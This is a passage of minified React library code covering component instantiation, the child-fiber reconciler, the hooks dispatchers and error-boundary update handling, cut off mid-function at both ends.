    return typeof i == "object" && i !== null ? i = Je(i) : (o = Fe(t) ? mn : Te.current, r = t.contextTypes, i = (r = r != null) ? er(e, o) : Zt), t = new t(n, i), e.memoizedState = t.state !== null && t.state !== void 0 ? t.state : null, t.updater = Ui, e.stateNode = t, t._reactInternals = e, r && (e = e.stateNode, e.__reactInternalMemoizedUnmaskedChildContext = o, e.__reactInternalMemoizedMaskedChildContext = i), t
}

function qu(e, t, n, r) {
    e = t.state, typeof t.componentWillReceiveProps == "function" && t.componentWillReceiveProps(n, r), typeof t.UNSAFE_componentWillReceiveProps == "function" && t.UNSAFE_componentWillReceiveProps(n, r), t.state !== e && Ui.enqueueReplaceState(t, t.state, null)
}

function ks(e, t, n, r) {
    var o = e.stateNode;
    o.props = n, o.state = e.memoizedState, o.refs = vf, Ra(e);
    var i = t.contextType;
    typeof i == "object" && i !== null ? o.context = Je(i) : (i = Fe(t) ? mn : Te.current, o.context = er(e, i)), o.state = e.memoizedState, i = t.getDerivedStateFromProps, typeof i == "function" && (Es(e, t, i, n), o.state = e.memoizedState), typeof t.getDerivedStateFromProps == "function" || typeof o.getSnapshotBeforeUpdate == "function" || typeof o.UNSAFE_componentWillMount != "function" && typeof o.componentWillMount != "function" || (t = o.state, typeof o.componentWillMount == "function" && o.componentWillMount(), typeof o.UNSAFE_componentWillMount == "function" && o.UNSAFE_componentWillMount(), t !== o.state && Ui.enqueueReplaceState(o, o.state, null), yi(e, n, o, r), o.state = e.memoizedState), typeof o.componentDidMount == "function" && (e.flags |= 4194308)
}

function kr(e, t, n) {
    if (e = n.ref, e !== null && typeof e != "function" && typeof e != "object") {
        if (n._owner) {
            if (n = n._owner, n) {
                if (n.tag !== 1) throw Error(T(309));
                var r = n.stateNode
            }
            if (!r) throw Error(T(147, e));
            var o = r, i = "" + e;
            return t !== null && t.ref !== null && typeof t.ref == "function" && t.ref._stringRef === i ? t.ref : (t = function (l) {
                var s = o.refs;
                s === vf && (s = o.refs = {}), l === null ? delete s[i] : s[i] = l
            }, t._stringRef = i, t)
        }
        if (typeof e != "string") throw Error(T(284));
        if (!n._owner) throw Error(T(290, e))
    }
    return e
}

function Do(e, t) {
    throw e = Object.prototype.toString.call(t), Error(T(31, e === "[object Object]" ? "object with keys {" + Object.keys(t).join(", ") + "}" : e))
}

function Zu(e) {
    var t = e._init;
    return t(e._payload)
}

function xf(e) {
    function t(g, h) {
        if (e) {
            var w = g.deletions;
            w === null ? (g.deletions = [h], g.flags |= 16) : w.push(h)
        }
    }

    function n(g, h) {
        if (!e) return null;
        for (; h !== null;) t(g, h), h = h.sibling;
        return null
    }

    function r(g, h) {
        for (g = new Map; h !== null;) h.key !== null ? g.set(h.key, h) : g.set(h.index, h), h = h.sibling;
        return g
    }

    function o(g, h) {
        return g = Jt(g, h), g.index = 0, g.sibling = null, g
    }

    function i(g, h, w) {
        return g.index = w, e ? (w = g.alternate, w !== null ? (w = w.index, w < h ? (g.flags |= 2, h) : w) : (g.flags |= 2, h)) : (g.flags |= 1048576, h)
    }

    function l(g) {
        return e && g.alternate === null && (g.flags |= 2), g
    }

    function s(g, h, w, S) {
        return h === null || h.tag !== 6 ? (h = Dl(w, g.mode, S), h.return = g, h) : (h = o(h, w), h.return = g, h)
    }

    function a(g, h, w, S) {
        var E = w.type;
        return E === Ln ? c(g, h, w.props.children, S, w.key) : h !== null && (h.elementType === E || typeof E == "object" && E !== null && E.$$typeof === Mt && Zu(E) === h.type) ? (S = o(h, w.props), S.ref = kr(g, h, w), S.return = g, S) : (S = qo(w.type, w.key, w.props, null, g.mode, S), S.ref = kr(g, h, w), S.return = g, S)
    }

    function u(g, h, w, S) {
        return h === null || h.tag !== 4 || h.stateNode.containerInfo !== w.containerInfo || h.stateNode.implementation !== w.implementation ? (h = Ml(w, g.mode, S), h.return = g, h) : (h = o(h, w.children || []), h.return = g, h)
    }

    function c(g, h, w, S, E) {
        return h === null || h.tag !== 7 ? (h = fn(w, g.mode, S, E), h.return = g, h) : (h = o(h, w), h.return = g, h)
    }

    function d(g, h, w) {
        if (typeof h == "string" && h !== "" || typeof h == "number") return h = Dl("" + h, g.mode, w), h.return = g, h;
        if (typeof h == "object" && h !== null) {
            switch (h.$$typeof) {
                case Eo:
                    return w = qo(h.type, h.key, h.props, null, g.mode, w), w.ref = kr(g, null, h), w.return = g, w;
                case Pn:
                    return h = Ml(h, g.mode, w), h.return = g, h;
                case Mt:
                    var S = h._init;
                    return d(g, S(h._payload), w)
            }
            if (Lr(h) || wr(h)) return h = fn(h, g.mode, w, null), h.return = g, h;
            Do(g, h)
        }
        return null
    }

    function p(g, h, w, S) {
        var E = h !== null ? h.key : null;
        if (typeof w == "string" && w !== "" || typeof w == "number") return E !== null ? null : s(g, h, "" + w, S);
        if (typeof w == "object" && w !== null) {
            switch (w.$$typeof) {
                case Eo:
                    return w.key === E ? a(g, h, w, S) : null;
                case Pn:
                    return w.key === E ? u(g, h, w, S) : null;
                case Mt:
                    return E = w._init, p(g, h, E(w._payload), S)
            }
            if (Lr(w) || wr(w)) return E !== null ? null : c(g, h, w, S, null);
            Do(g, w)
        }
        return null
    }

    function x(g, h, w, S, E) {
        if (typeof S == "string" && S !== "" || typeof S == "number") return g = g.get(w) || null, s(h, g, "" + S, E);
        if (typeof S == "object" && S !== null) {
            switch (S.$$typeof) {
                case Eo:
                    return g = g.get(S.key === null ? w : S.key) || null, a(h, g, S, E);
                case Pn:
                    return g = g.get(S.key === null ? w : S.key) || null, u(h, g, S, E);
                case Mt:
                    var N = S._init;
                    return x(g, h, w, N(S._payload), E)
            }
            if (Lr(S) || wr(S)) return g = g.get(w) || null, c(h, g, S, E, null);
            Do(h, S)
        }
        return null
    }

    function y(g, h, w, S) {
        for (var E = null, N = null, R = h, O = h = 0, B = null; R !== null && O < w.length; O++) {
            R.index > O ? (B = R, R = null) : B = R.sibling;
            var D = p(g, R, w[O], S);
            if (D === null) {
                R === null && (R = B);
                break
            }
            e && R && D.alternate === null && t(g, R), h = i(D, h, O), N === null ? E = D : N.sibling = D, N = D, R = B
        }
        if (O === w.length) return n(g, R), Z && ln(g, O), E;
        if (R === null) {
            for (; O < w.length; O++) R = d(g, w[O], S), R !== null && (h = i(R, h, O), N === null ? E = R : N.sibling = R, N = R);
            return Z && ln(g, O), E
        }
        for (R = r(g, R); O < w.length; O++) B = x(R, g, O, w[O], S), B !== null && (e && B.alternate !== null && R.delete(B.key === null ? O : B.key), h = i(B, h, O), N === null ? E = B : N.sibling = B, N = B);
        return e && R.forEach(function (M) {
            return t(g, M)
        }), Z && ln(g, O), E
    }

    function v(g, h, w, S) {
        var E = wr(w);
        if (typeof E != "function") throw Error(T(150));
        if (w = E.call(w), w == null) throw Error(T(151));
        for (var N = E = null, R = h, O = h = 0, B = null, D = w.next(); R !== null && !D.done; O++, D = w.next()) {
            R.index > O ? (B = R, R = null) : B = R.sibling;
            var M = p(g, R, D.value, S);
            if (M === null) {
                R === null && (R = B);
                break
            }
            e && R && M.alternate === null && t(g, R), h = i(M, h, O), N === null ? E = M : N.sibling = M, N = M, R = B
        }
        if (D.done) return n(g, R), Z && ln(g, O), E;
        if (R === null) {
            for (; !D.done; O++, D = w.next()) D = d(g, D.value, S), D !== null && (h = i(D, h, O), N === null ? E = D : N.sibling = D, N = D);
            return Z && ln(g, O), E
        }
        for (R = r(g, R); !D.done; O++, D = w.next()) D = x(R, g, O, D.value, S), D !== null && (e && D.alternate !== null && R.delete(D.key === null ? O : D.key), h = i(D, h, O), N === null ? E = D : N.sibling = D, N = D);
        return e && R.forEach(function (A) {
            return t(g, A)
        }), Z && ln(g, O), E
    }

    function C(g, h, w, S) {
        if (typeof w == "object" && w !== null && w.type === Ln && w.key === null && (w = w.props.children), typeof w == "object" && w !== null) {
            switch (w.$$typeof) {
                case Eo:
                    e:{
                        for (var E = w.key, N = h; N !== null;) {
                            if (N.key === E) {
                                if (E = w.type, E === Ln) {
                                    if (N.tag === 7) {
                                        n(g, N.sibling), h = o(N, w.props.children), h.return = g, g = h;
                                        break e
                                    }
                                } else if (N.elementType === E || typeof E == "object" && E !== null && E.$$typeof === Mt && Zu(E) === N.type) {
                                    n(g, N.sibling), h = o(N, w.props), h.ref = kr(g, N, w), h.return = g, g = h;
                                    break e
                                }
                                n(g, N);
                                break
                            } else t(g, N);
                            N = N.sibling
                        }
                        w.type === Ln ? (h = fn(w.props.children, g.mode, S, w.key), h.return = g, g = h) : (S = qo(w.type, w.key, w.props, null, g.mode, S), S.ref = kr(g, h, w), S.return = g, g = S)
                    }
                    return l(g);
                case Pn:
                    e:{
                        for (N = w.key; h !== null;) {
                            if (h.key === N) if (h.tag === 4 && h.stateNode.containerInfo === w.containerInfo && h.stateNode.implementation === w.implementation) {
                                n(g, h.sibling), h = o(h, w.children || []), h.return = g, g = h;
                                break e
                            } else {
                                n(g, h);
                                break
                            } else t(g, h);
                            h = h.sibling
                        }
                        h = Ml(w, g.mode, S), h.return = g, g = h
                    }
                    return l(g);
                case Mt:
                    return N = w._init, C(g, h, N(w._payload), S)
            }
            if (Lr(w)) return y(g, h, w, S);
            if (wr(w)) return v(g, h, w, S);
            Do(g, w)
        }
        return typeof w == "string" && w !== "" || typeof w == "number" ? (w = "" + w, h !== null && h.tag === 6 ? (n(g, h.sibling), h = o(h, w), h.return = g, g = h) : (n(g, h), h = Dl(w, g.mode, S), h.return = g, g = h), l(g)) : n(g, h)
    }

    return C
}

var nr = xf(!0), Sf = xf(!1), go = {}, ht = tn(go), no = tn(go), ro = tn(go);

function cn(e) {
    if (e === go) throw Error(T(174));
    return e
}

function Ta(e, t) {
    switch (Y(ro, t), Y(no, e), Y(ht, go), e = t.nodeType, e) {
        case 9:
        case 11:
            t = (t = t.documentElement) ? t.namespaceURI : ns(null, "");
            break;
        default:
            e = e === 8 ? t.parentNode : t, t = e.namespaceURI || null, e = e.tagName, t = ns(t, e)
    }
    q(ht), Y(ht, t)
}

function rr() {
    q(ht), q(no), q(ro)
}

function Cf(e) {
    cn(ro.current);
    var t = cn(ht.current), n = ns(t, e.type);
    t !== n && (Y(no, e), Y(ht, n))
}

function ja(e) {
    no.current === e && (q(ht), q(no))
}

var ne = tn(0);

function vi(e) {
    for (var t = e; t !== null;) {
        if (t.tag === 13) {
            var n = t.memoizedState;
            if (n !== null && (n = n.dehydrated, n === null || n.data === "$?" || n.data === "$!")) return t
        } else if (t.tag === 19 && t.memoizedProps.revealOrder !== void 0) {
            if (t.flags & 128) return t
        } else if (t.child !== null) {
            t.child.return = t, t = t.child;
            continue
        }
        if (t === e) break;
        for (; t.sibling === null;) {
            if (t.return === null || t.return === e) return null;
            t = t.return
        }
        t.sibling.return = t.return, t = t.sibling
    }
    return null
}

var jl = [];

function Oa() {
    for (var e = 0; e < jl.length; e++) jl[e]._workInProgressVersionPrimary = null;
    jl.length = 0
}

var Go = _t.ReactCurrentDispatcher, Ol = _t.ReactCurrentBatchConfig, gn = 0, re = null, pe = null, he = null, wi = !1,
    Ur = !1, oo = 0, ky = 0;

function Ce() {
    throw Error(T(321))
}

function _a(e, t) {
    if (t === null) return !1;
    for (var n = 0; n < t.length && n < e.length; n++) if (!at(e[n], t[n])) return !1;
    return !0
}

function Pa(e, t, n, r, o, i) {
    if (gn = i, re = t, t.memoizedState = null, t.updateQueue = null, t.lanes = 0, Go.current = e === null || e.memoizedState === null ? jy : Oy, e = n(r, o), Ur) {
        i = 0;
        do {
            if (Ur = !1, oo = 0, 25 <= i) throw Error(T(301));
            i += 1, he = pe = null, t.updateQueue = null, Go.current = _y, e = n(r, o)
        } while (Ur)
    }
    if (Go.current = xi, t = pe !== null && pe.next !== null, gn = 0, he = pe = re = null, wi = !1, t) throw Error(T(300));
    return e
}

function La() {
    var e = oo !== 0;
    return oo = 0, e
}

function ct() {
    var e = {memoizedState: null, baseState: null, baseQueue: null, queue: null, next: null};
    return he === null ? re.memoizedState = he = e : he = he.next = e, he
}

function qe() {
    if (pe === null) {
        var e = re.alternate;
        e = e !== null ? e.memoizedState : null
    } else e = pe.next;
    var t = he === null ? re.memoizedState : he.next;
    if (t !== null) he = t, pe = e; else {
        if (e === null) throw Error(T(310));
        pe = e, e = {
            memoizedState: pe.memoizedState,
            baseState: pe.baseState,
            baseQueue: pe.baseQueue,
            queue: pe.queue,
            next: null
        }, he === null ? re.memoizedState = he = e : he = he.next = e
    }
    return he
}

function io(e, t) {
    return typeof t == "function" ? t(e) : t
}

function _l(e) {
    var t = qe(), n = t.queue;
    if (n === null) throw Error(T(311));
    n.lastRenderedReducer = e;
    var r = pe, o = r.baseQueue, i = n.pending;
    if (i !== null) {
        if (o !== null) {
            var l = o.next;
            o.next = i.next, i.next = l
        }
        r.baseQueue = o = i, n.pending = null
    }
    if (o !== null) {
        i = o.next, r = r.baseState;
        var s = l = null, a = null, u = i;
        do {
            var c = u.lane;
            if ((gn & c) === c) a !== null && (a = a.next = {
                lane: 0,
                action: u.action,
                hasEagerState: u.hasEagerState,
                eagerState: u.eagerState,
                next: null
            }), r = u.hasEagerState ? u.eagerState : e(r, u.action); else {
                var d = {
                    lane: c,
                    action: u.action,
                    hasEagerState: u.hasEagerState,
                    eagerState: u.eagerState,
                    next: null
                };
                a === null ? (s = a = d, l = r) : a = a.next = d, re.lanes |= c, yn |= c
            }
            u = u.next
        } while (u !== null && u !== i);
        a === null ? l = r : a.next = s, at(r, t.memoizedState) || (Me = !0), t.memoizedState = r, t.baseState = l, t.baseQueue = a, n.lastRenderedState = r
    }
    if (e = n.interleaved, e !== null) {
        o = e;
        do i = o.lane, re.lanes |= i, yn |= i, o = o.next; while (o !== e)
    } else o === null && (n.lanes = 0);
    return [t.memoizedState, n.dispatch]
}

function Pl(e) {
    var t = qe(), n = t.queue;
    if (n === null) throw Error(T(311));
    n.lastRenderedReducer = e;
    var r = n.dispatch, o = n.pending, i = t.memoizedState;
    if (o !== null) {
        n.pending = null;
        var l = o = o.next;
        do i = e(i, l.action), l = l.next; while (l !== o);
        at(i, t.memoizedState) || (Me = !0), t.memoizedState = i, t.baseQueue === null && (t.baseState = i), n.lastRenderedState = i
    }
    return [i, r]
}

function Ef() {
}

function kf(e, t) {
    var n = re, r = qe(), o = t(), i = !at(r.memoizedState, o);
    if (i && (r.memoizedState = o, Me = !0), r = r.queue, Ia(Tf.bind(null, n, r, e), [e]), r.getSnapshot !== t || i || he !== null && he.memoizedState.tag & 1) {
        if (n.flags |= 2048, lo(9, Rf.bind(null, n, r, o, t), void 0, null), ge === null) throw Error(T(349));
        gn & 30 || Nf(n, t, o)
    }
    return o
}

function Nf(e, t, n) {
    e.flags |= 16384, e = {getSnapshot: t, value: n}, t = re.updateQueue, t === null ? (t = {
        lastEffect: null,
        stores: null
    }, re.updateQueue = t, t.stores = [e]) : (n = t.stores, n === null ? t.stores = [e] : n.push(e))
}

function Rf(e, t, n, r) {
    t.value = n, t.getSnapshot = r, jf(t) && Of(e)
}

function Tf(e, t, n) {
    return n(function () {
        jf(t) && Of(e)
    })
}

function jf(e) {
    var t = e.getSnapshot;
    e = e.value;
    try {
        var n = t();
        return !at(e, n)
    } catch {
        return !0
    }
}

function Of(e) {
    var t = Tt(e, 1);
    t !== null && st(t, e, 1, -1)
}

function ec(e) {
    var t = ct();
    return typeof e == "function" && (e = e()), t.memoizedState = t.baseState = e, e = {
        pending: null,
        interleaved: null,
        lanes: 0,
        dispatch: null,
        lastRenderedReducer: io,
        lastRenderedState: e
    }, t.queue = e, e = e.dispatch = Ty.bind(null, re, e), [t.memoizedState, e]
}

function lo(e, t, n, r) {
    return e = {
        tag: e,
        create: t,
        destroy: n,
        deps: r,
        next: null
    }, t = re.updateQueue, t === null ? (t = {
        lastEffect: null,
        stores: null
    }, re.updateQueue = t, t.lastEffect = e.next = e) : (n = t.lastEffect, n === null ? t.lastEffect = e.next = e : (r = n.next, n.next = e, e.next = r, t.lastEffect = e)), e
}

function _f() {
    return qe().memoizedState
}

function Qo(e, t, n, r) {
    var o = ct();
    re.flags |= e, o.memoizedState = lo(1 | t, n, void 0, r === void 0 ? null : r)
}

function bi(e, t, n, r) {
    var o = qe();
    r = r === void 0 ? null : r;
    var i = void 0;
    if (pe !== null) {
        var l = pe.memoizedState;
        if (i = l.destroy, r !== null && _a(r, l.deps)) {
            o.memoizedState = lo(t, n, i, r);
            return
        }
    }
    re.flags |= e, o.memoizedState = lo(1 | t, n, i, r)
}

function tc(e, t) {
    return Qo(8390656, 8, e, t)
}

function Ia(e, t) {
    return bi(2048, 8, e, t)
}

function Pf(e, t) {
    return bi(4, 2, e, t)
}

function Lf(e, t) {
    return bi(4, 4, e, t)
}

function If(e, t) {
    if (typeof t == "function") return e = e(), t(e), function () {
        t(null)
    };
    if (t != null) return e = e(), t.current = e, function () {
        t.current = null
    }
}

function Df(e, t, n) {
    return n = n != null ? n.concat([e]) : null, bi(4, 4, If.bind(null, t, e), n)
}

function Da() {
}

function Mf(e, t) {
    var n = qe();
    t = t === void 0 ? null : t;
    var r = n.memoizedState;
    return r !== null && t !== null && _a(t, r[1]) ? r[0] : (n.memoizedState = [e, t], e)
}

function $f(e, t) {
    var n = qe();
    t = t === void 0 ? null : t;
    var r = n.memoizedState;
    return r !== null && t !== null && _a(t, r[1]) ? r[0] : (e = e(), n.memoizedState = [e, t], e)
}

function Ff(e, t, n) {
    return gn & 21 ? (at(n, t) || (n = zd(), re.lanes |= n, yn |= n, e.baseState = !0), t) : (e.baseState && (e.baseState = !1, Me = !0), e.memoizedState = n)
}

function Ny(e, t) {
    var n = Q;
    Q = n !== 0 && 4 > n ? n : 4, e(!0);
    var r = Ol.transition;
    Ol.transition = {};
    try {
        e(!1), t()
    } finally {
        Q = n, Ol.transition = r
    }
}

function Af() {
    return qe().memoizedState
}

function Ry(e, t, n) {
    var r = Yt(e);
    if (n = {
        lane: r,
        action: n,
        hasEagerState: !1,
        eagerState: null,
        next: null
    }, zf(e)) Bf(t, n); else if (n = gf(e, t, n, r), n !== null) {
        var o = Pe();
        st(n, e, r, o), Uf(n, t, r)
    }
}

function Ty(e, t, n) {
    var r = Yt(e), o = {lane: r, action: n, hasEagerState: !1, eagerState: null, next: null};
    if (zf(e)) Bf(t, o); else {
        var i = e.alternate;
        if (e.lanes === 0 && (i === null || i.lanes === 0) && (i = t.lastRenderedReducer, i !== null)) try {
            var l = t.lastRenderedState, s = i(l, n);
            if (o.hasEagerState = !0, o.eagerState = s, at(s, l)) {
                var a = t.interleaved;
                a === null ? (o.next = o, Na(t)) : (o.next = a.next, a.next = o), t.interleaved = o;
                return
            }
        } catch {
        } finally {
        }
        n = gf(e, t, o, r), n !== null && (o = Pe(), st(n, e, r, o), Uf(n, t, r))
    }
}

function zf(e) {
    var t = e.alternate;
    return e === re || t !== null && t === re
}

function Bf(e, t) {
    Ur = wi = !0;
    var n = e.pending;
    n === null ? t.next = t : (t.next = n.next, n.next = t), e.pending = t
}

function Uf(e, t, n) {
    if (n & 4194240) {
        var r = t.lanes;
        r &= e.pendingLanes, n |= r, t.lanes = n, da(e, n)
    }
}

var xi = {
    readContext: Je,
    useCallback: Ce,
    useContext: Ce,
    useEffect: Ce,
    useImperativeHandle: Ce,
    useInsertionEffect: Ce,
    useLayoutEffect: Ce,
    useMemo: Ce,
    useReducer: Ce,
    useRef: Ce,
    useState: Ce,
    useDebugValue: Ce,
    useDeferredValue: Ce,
    useTransition: Ce,
    useMutableSource: Ce,
    useSyncExternalStore: Ce,
    useId: Ce,
    unstable_isNewReconciler: !1
}, jy = {
    readContext: Je, useCallback: function (e, t) {
        return ct().memoizedState = [e, t === void 0 ? null : t], e
    }, useContext: Je, useEffect: tc, useImperativeHandle: function (e, t, n) {
        return n = n != null ? n.concat([e]) : null, Qo(4194308, 4, If.bind(null, t, e), n)
    }, useLayoutEffect: function (e, t) {
        return Qo(4194308, 4, e, t)
    }, useInsertionEffect: function (e, t) {
        return Qo(4, 2, e, t)
    }, useMemo: function (e, t) {
        var n = ct();
        return t = t === void 0 ? null : t, e = e(), n.memoizedState = [e, t], e
    }, useReducer: function (e, t, n) {
        var r = ct();
        return t = n !== void 0 ? n(t) : t, r.memoizedState = r.baseState = t, e = {
            pending: null,
            interleaved: null,
            lanes: 0,
            dispatch: null,
            lastRenderedReducer: e,
            lastRenderedState: t
        }, r.queue = e, e = e.dispatch = Ry.bind(null, re, e), [r.memoizedState, e]
    }, useRef: function (e) {
        var t = ct();
        return e = {current: e}, t.memoizedState = e
    }, useState: ec, useDebugValue: Da, useDeferredValue: function (e) {
        return ct().memoizedState = e
    }, useTransition: function () {
        var e = ec(!1), t = e[0];
        return e = Ny.bind(null, e[1]), ct().memoizedState = e, [t, e]
    }, useMutableSource: function () {
    }, useSyncExternalStore: function (e, t, n) {
        var r = re, o = ct();
        if (Z) {
            if (n === void 0) throw Error(T(407));
            n = n()
        } else {
            if (n = t(), ge === null) throw Error(T(349));
            gn & 30 || Nf(r, t, n)
        }
        o.memoizedState = n;
        var i = {value: n, getSnapshot: t};
        return o.queue = i, tc(Tf.bind(null, r, i, e), [e]), r.flags |= 2048, lo(9, Rf.bind(null, r, i, n, t), void 0, null), n
    }, useId: function () {
        var e = ct(), t = ge.identifierPrefix;
        if (Z) {
            var n = St, r = xt;
            n = (r & ~(1 << 32 - lt(r) - 1)).toString(32) + n, t = ":" + t + "R" + n, n = oo++, 0 < n && (t += "H" + n.toString(32)), t += ":"
        } else n = ky++, t = ":" + t + "r" + n.toString(32) + ":";
        return e.memoizedState = t
    }, unstable_isNewReconciler: !1
}, Oy = {
    readContext: Je,
    useCallback: Mf,
    useContext: Je,
    useEffect: Ia,
    useImperativeHandle: Df,
    useInsertionEffect: Pf,
    useLayoutEffect: Lf,
    useMemo: $f,
    useReducer: _l,
    useRef: _f,
    useState: function () {
        return _l(io)
    },
    useDebugValue: Da,
    useDeferredValue: function (e) {
        var t = qe();
        return Ff(t, pe.memoizedState, e)
    },
    useTransition: function () {
        var e = _l(io)[0], t = qe().memoizedState;
        return [e, t]
    },
    useMutableSource: Ef,
    useSyncExternalStore: kf,
    useId: Af,
    unstable_isNewReconciler: !1
}, _y = {
    readContext: Je,
    useCallback: Mf,
    useContext: Je,
    useEffect: Ia,
    useImperativeHandle: Df,
    useInsertionEffect: Pf,
    useLayoutEffect: Lf,
    useMemo: $f,
    useReducer: Pl,
    useRef: _f,
    useState: function () {
        return Pl(io)
    },
    useDebugValue: Da,
    useDeferredValue: function (e) {
        var t = qe();
        return pe === null ? t.memoizedState = e : Ff(t, pe.memoizedState, e)
    },
    useTransition: function () {
        var e = Pl(io)[0], t = qe().memoizedState;
        return [e, t]
    },
    useMutableSource: Ef,
    useSyncExternalStore: kf,
    useId: Af,
    unstable_isNewReconciler: !1
};

function or(e, t) {
    try {
        var n = "", r = t;
        do n += og(r), r = r.return; while (r);
        var o = n
    } catch (i) {
        o = `
Error generating stack: ` + i.message + `
` + i.stack
    }
    return {value: e, source: t, stack: o, digest: null}
}

function Ll(e, t, n) {
    return {value: e, source: null, stack: n ?? null, digest: t ?? null}
}

function Ns(e, t) {
    try {
        console.error(t.value)
    } catch (n) {
        setTimeout(function () {
            throw n
        })
    }
}

var Py = typeof WeakMap == "function" ? WeakMap : Map;

function bf(e, t, n) {
    n = Ct(-1, n), n.tag = 3, n.payload = {element: null};
    var r = t.value;
    return n.callback = function () {
        Ci || (Ci = !0, Ms = r), Ns(e, t)
    }, n
}

function Hf(e, t, n) {
    n = Ct(-1, n), n.tag = 3;
    var r = e.type.getDerivedStateFromError;
    if (typeof r == "function") {
        var o = t.value;
        n.payload = function () {
            return r(o)
        }, n.callback = function () {
            Ns(e, t)
        }
    }
    var i = e.stateNode;
    return i !== null && typeof i.componentDidCatch == "function" && (n.callback = function () {
        Ns(e, t), typeof r != "function" && (Xt === null ? Xt = new Set([this]) : Xt.add(this));
        var l = t.stack;
        this.componentDidCatch(t.value, {componentStack: l !== null ? l : ""})
    }), n
}

function nc(e, t, n) {
    var r = e.pingCache;
    if (r === null) {
        r = e.pingCache = new Py;
        var o = new Set;
        r.set(t, o)
    } else o = r.get(t), o === void 0 && (o = new Set, r.set(t, o));
    o.has(n) || (o.add(n), e = Vy.bind(null, e, t, n), t.then(e, e))
}

function rc(e) {
    do {
        var t;
        if ((t = e.tag === 13) && (t = e.memoizedState, t = t !== null ? t.dehydrated !== null : !0), t) return e;
        e = e.return
    } while (e !== null);
    return null
}

function oc(e, t, n, r, o) {
    return e.mode & 1 ? (e.flags |= 65536, e.lanes = o, e) : (e === t ? e.flags |= 65536 : (e.flags |= 128, n.flags |= 131072, n.flags &= -52805, n.tag === 1 && (n.alternate === null ? n.tag = 17 : (t = Ct(-1, 1), t.tag = 2, Qt(n, t, 1))), n.lanes |= 1), e)
}

var Ly = _t.ReactCurrentOwner, Me = !1;

function Oe(e, t, n, r) {
    t.child = e === null ? Sf(t, null, n, r) : nr(t, e.child, n, r)
}

function ic(e, t, n, r, o) {
    n = n.render;
    var i = t.ref;
    return Qn(t, o), r = Pa(e, t, n, r, i, o), n = La(), e !== null && !Me ? (t.updateQueue = e.updateQueue, t.flags &= -2053, e.lanes &= ~o, jt(e, t, o)) : (Z && n && wa(t), t.flags |= 1, Oe(e, t, r, o), t.child)
}

function lc(e, t, n, r, o) {
    if (e === null) {
        var i = n.type;
        return typeof i == "function" && !ba(i) && i.defaultProps === void 0 && n.compare === null && n.defaultProps === void 0 ? (t.tag = 15, t.type = i, Wf(e, t, i, r, o)) : (e = qo(n.type, null, r, t, t.mode, o), e.ref = t.ref, e.return = t, t.child = e)
    }
    if (i = e.child, !(e.lanes & o)) {
        var l = i.memoizedProps;
        if (n = n.compare, n = n !== null ? n : qr, n(l, r) && e.ref === t.ref) return jt(e, t, o)
    }
    return t.flags |= 1, e = Jt(i, r), e.ref = t.ref, e.return = t, t.child = e
}

function Wf(e, t, n, r, o) {
    if (e !== null) {
        var i = e.memoizedProps;
        if (qr(i, r) && e.ref === t.ref) if (Me = !1, t.pendingProps = r = i, (e.lanes & o) !== 0) e.flags & 131072 && (Me = !0); else return t.lanes = e.lanes, jt(e, t, o)
    }
    return Rs(e, t, n, r, o)
}

function Vf(e, t, n) {
    var r = t.pendingProps, o = r.children, i = e !== null ? e.memoizedState : null;
    if (r.mode === "hidden") if (!(t.mode & 1)) t.memoizedState = {
        baseLanes: 0,
        cachePool: null,
        transitions: null
    }, Y(bn, ze), ze |= n; else {
        if (!(n & 1073741824)) return e = i !== null ? i.baseLanes | n : n, t.lanes = t.childLanes = 1073741824, t.memoizedState = {
            baseLanes: e,
            cachePool: null,
            transitions: null
        }, t.updateQueue = null, Y(bn, ze), ze |= e, null;
        t.memoizedState = {
            baseLanes: 0,
            cachePool: null,
            transitions: null
        }, r = i !== null ? i.baseLanes : n, Y(bn, ze), ze |= r
    } else i !== null ? (r = i.baseLanes | n, t.memoizedState = null) : r = n, Y(bn, ze), ze |= r;
    return Oe(e, t, o, n), t.child
}

function Kf(e, t) {
    var n = t.ref;
    (e === null && n !== null || e !== null && e.ref !== n) && (t.flags |= 512, t.flags |= 2097152)
}

function Rs(e, t, n, r, o) {
    var i = Fe(n) ? mn : Te.current;
    return i = er(t, i), Qn(t, o), n = Pa(e, t, n, r, i, o), r = La(), e !== null && !Me ? (t.updateQueue = e.updateQueue, t.flags &= -2053, e.lanes &= ~o, jt(e, t, o)) : (Z && r && wa(t), t.flags |= 1, Oe(e, t, n, o), t.child)
}

function sc(e, t, n, r, o) {
    if (Fe(n)) {
        var i = !0;
        fi(t)
    } else i = !1;
    if (Qn(t, o), t.stateNode === null) Xo(e, t), wf(t, n, r), ks(t, n, r, o), r = !0; else if (e === null) {
        var l = t.stateNode, s = t.memoizedProps;
        l.props = s;
        var a = l.context, u = n.contextType;
        typeof u == "object" && u !== null ? u = Je(u) : (u = Fe(n) ? mn : Te.current, u = er(t, u));
        var c = n.getDerivedStateFromProps,
            d = typeof c == "function" || typeof l.getSnapshotBeforeUpdate == "function";
        d || typeof l.UNSAFE_componentWillReceiveProps != "function" && typeof l.componentWillReceiveProps != "function" || (s !== r || a !== u) && qu(t, l, r, u), $t = !1;
        var p = t.memoizedState;
        l.state = p, yi(t, r, l, o), a = t.memoizedState, s !== r || p !== a || $e.current || $t ? (typeof c == "function" && (Es(t, n, c, r), a = t.memoizedState), (s = $t || Ju(t, n, s, r, p, a, u)) ? (d || typeof l.UNSAFE_componentWillMount != "function" && typeof l.componentWillMount != "function" || (typeof l.componentWillMount == "function" && l.componentWillMount(), typeof l.UNSAFE_componentWillMount == "function" && l.UNSAFE_componentWillMount()), typeof l.componentDidMount == "function" && (t.flags |= 4194308)) : (typeof l.componentDidMount == "function" && (t.flags |= 4194308), t.memoizedProps = r, t.memoizedState = a), l.props = r, l.state = a, l.context = u, r = s) : (typeof l.componentDidMount == "function" && (t.flags |= 4194308), r = !1)
    } else {
        l = t.stateNode, yf(e, t), s = t.memoizedProps, u = t.type === t.elementType ? s : tt(t.type, s), l.props = u, d = t.pendingProps, p = l.context, a = n.contextType, typeof a == "object" && a !== null ? a = Je(a) : (a = Fe(n) ? mn : Te.current, a = er(t, a));
        var x = n.getDerivedStateFromProps;
        (c = typeof x == "function" || typeof l.getSnapshotBeforeUpdate == "function") || typeof l.UNSAFE_componentWillReceiveProps != "function" && typeof l.componentWillReceiveProps != "function" || (s !== d || p !== a) && qu(t, l, r, a), $t = !1, p = t.memoizedState, l.state = p, yi(t, r, l, o);
        var y = t.memoizedState;
